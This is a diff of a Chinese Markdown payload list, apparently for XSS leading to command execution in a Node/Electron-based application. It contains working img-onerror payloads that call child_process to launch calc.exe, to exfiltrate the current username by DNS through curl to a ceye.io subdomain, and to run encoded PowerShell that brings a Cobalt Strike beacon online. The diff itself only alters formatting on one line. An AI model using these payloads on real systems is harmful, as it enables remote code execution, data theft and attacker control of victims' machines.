@@ -3,5 +3,5 @@
 # 部分payload
 简单弹窗`<img src=1 onerror=alert("1")>`<br>
 弹计算器`<img src=# onerror="require('child_process').exec('calc.exe',null);">`<br>
-DNS带外`<img src=x onerror="const exec = require('child_process').exec;exec('curl `whoami`.domain.ceye.io').stdout.on('data', function (data) {alert(data);})">`<br>
+DNS带外``<img src=x onerror="const exec = require('child_process').exec;exec('curl `whoami`.domain.ceye.io').stdout.on('data', function (data) {alert(data);})">``<br>
 通过对powershell进行编码，然后替换payload上线cs`<img src=x onerror="const exec = require('child_process').exec;exec('powershell（……）').stdout.on('data', function (data) {alert(data);})">`
